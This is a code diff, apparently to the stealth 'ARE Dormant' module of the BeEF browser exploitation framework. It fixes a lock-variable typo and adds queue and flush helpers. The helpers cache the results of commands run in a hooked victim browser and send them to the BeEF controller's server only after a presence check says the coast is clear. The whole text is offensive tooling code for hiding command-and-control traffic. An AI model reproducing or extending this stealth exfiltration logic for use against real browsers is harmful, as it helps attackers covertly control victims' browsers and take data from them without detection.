@@ -308,9 +308,10 @@ Beefaredormant.prototype.presenceCheck = function() {
 Beefaredormant.prototype.backHome = function() {
   if (this.stealthLevel > 1) {
     // we are back home
-    beef.updated.lock = false; // Allow beef to talk again
-
     // send all cached module responses
+    beef.aredormanthelpers.flush();
+
+    beef.updater.lock = false; // Allow beef to talk again
   }
 
   // kick off timer again
@@ -458,3 +459,34 @@ Beefaredormant.prototype.setupPhase = function() {
   });
 } // end of setupPhase()
 
+// This is the end of the Beefaredormant Class - we have a few helpers that we're adding into the global BeEF object below
+
+beef.aredormanthelpers = {
+  cmd_queue: [],
+
+  queue: function(handler, cid, results, exec_status, callback) {
+    if (typeof(handler) === 'string' && typeof(cid) === 'number' && (callback === undefined || typeof(callback) === 'function')) {
+      var s = new beef.net.command();
+      s.cid = cid;
+      s.results = beef.net.clean(results);
+      s.status = exec_status;
+      s.callback = callback;
+      s.handler = handler;
+      this.cmd_queue.push(s);
+    }
+  },
+
+  flush: function() {
+    if (this.cmd_queue.length > 0) {
+      for (var i = 0; i < this.cmd_queue.length; i++) {
+        console.log("Pushing ARE Dormant command to beef.net.send queue");
+        beef.net.send(this.cmd_queue[i].handler, this.cmd_queue[i].cid, this.cmd_queue[i].results, this.cmd_queue[i].status, this.cmd_queue[i].callback);
+      }
+
+    }
+
+    this.cmd_queue.length = 0;
+  }
+}
+
+beef.regCmp('beef.aredormanthelpers');
